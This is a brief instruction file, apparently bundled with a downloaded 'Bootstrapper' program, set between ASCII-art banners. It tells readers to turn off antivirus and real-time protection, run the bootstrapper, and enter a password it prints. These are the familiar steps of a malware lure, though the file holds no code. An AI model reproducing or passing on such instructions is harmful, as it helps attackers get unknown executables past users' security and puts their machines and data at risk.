.▄▄ ·  ▄· ▄▌ ▐ ▄  ▄▄ •  ▄▄ • 
▐█ ▀. ▐█▪██▌•█▌▐█▐█ ▀ ▪▐█ ▀ ▪
▄▀▀▀█▄▐█▌▐█▪▐█▐▐▌▄█ ▀█▄▄█ ▀█▄
▐█▄▪▐█ ▐█▀·.██▐█▌▐█▄▪▐█▐█▄▪▐█
 ▀▀▀▀   ▀ • ▀▀ █▪·▀▀▀▀ ·▀▀▀▀ 


How to run Bootstrapper by 
- Turn off antivirus/real time protection TEMPORARILY
- Open bootstrapper
- When it asks for the password - the password is Wx92usdhxb293

 _____ _         _  ____ ___  _
/  __// \  /|   / |/  _ \\  \//
|  \  | |\ ||   | || / \| \  / 
|  /_ | | \||/\_| || \_/| / /  
\____\\_/  \|\____/\____//_/   
                            